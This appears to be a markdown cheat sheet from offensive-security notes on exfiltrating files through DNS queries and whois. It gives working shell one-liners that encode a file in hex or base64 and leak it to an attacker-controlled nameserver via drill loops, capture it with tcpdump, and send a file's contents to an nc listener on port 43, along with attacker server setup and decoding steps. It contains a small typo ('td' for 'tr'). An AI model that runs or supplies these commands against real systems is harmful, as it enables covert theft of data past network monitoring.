# DNS

## 01 - Unix Shell

### 1.1 - Hex Encoded DNS Exfiltration

TODO: Provide a step process for exfiltrating DNS server on the attacker machine

#### 1.1.1 - Server Setup

##### 1.1.1.1 - BIND9

```
$ sudo apt install bind9
```

##### 1.1.1.2 - Dnsmasq

```
$ sudo apt install dnsmasq
```

#### 1.1.1 - Workstation Setup

- Install for Debian-based distros

```
$ sudo apt install ldnsutils dnsutils
```

- Install for Arch-based distros

```
$ sudo pacman -S bind
```

#### 1.1.2 - Usage

- On the target workstation

```
$ xxd -p file.txt > file.hex

$ while read line; do drill $line.<nameserver_dns_server>; done < file.hex

$ grep -Eo [0-9a-f]*.<nameserver_dns_server_IP> /var/lib/bind/query.log | cut -d "." -f 1 | uniq > file.hex

$ xxd -r -p file.hex > file.txt
```

### 1.2 - Base64 Encoded DNS Exfiltration

#### 1.2.1 - TCPDump

##### 1.2.1.1 - Target Workstation

```
$ base64 file.txt | td -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed 's/$/<domain.com>/'
```

##### 1.2.1.2 - Attacker Server

- Monitor port 53

```
$ sudo tcpdump -i <interface> udp port 53
```

- Decode results

```
$ echo "<base64_encoded>" | cut -d "." -f1-8 | tr -d "." | base64 -d
```

### 1.3 - Whois

```
$ whois -h <IP> -p 43 $(cat /path/to/file.txt)

$ sudo nc -lnvp 43
```

---
## References

- [Staged Payloads from Kali Linux | PT Phone Home â€“ DNS](https://www.offsec.com/offsec/staged-payloads-from-kalki-linux-pt-phone-hone-dns/)

- [Downloading Files Through Recursive DNS With Bash (Or PowerShell)](http://breenmachine.blogspot.com/2014/03/downloading-files-through-recursive-dns.html)

- [NotSoSecure: Out of Band Exploitation (OOB) CheatSheet](https://notsosecure.com/out-band-exploitation-oob-cheatsheet)

- [DNS exfiltration of data: step-by-step simple guide](https://hinty.io/devforth/dns-exfiltration-of-data-step-by-step-simple-guide/)

- [Setting Up Your Own Malicious DNS Server For Data Exfiltration (Without a DNS Server)](https://john-woodman.com/research/dns-exfiltration-setup/)

- [Deploy Self hosted interactsh-server for Blind & Out of Band Testing](https://takshilp.medium.com/oob-blind-testing-using-dns-exfiltration-54bcc004a0fb)

- [Data-Bouncing - The art of indirect exfiltration.](https://thecontractor.io/data-bouncing/)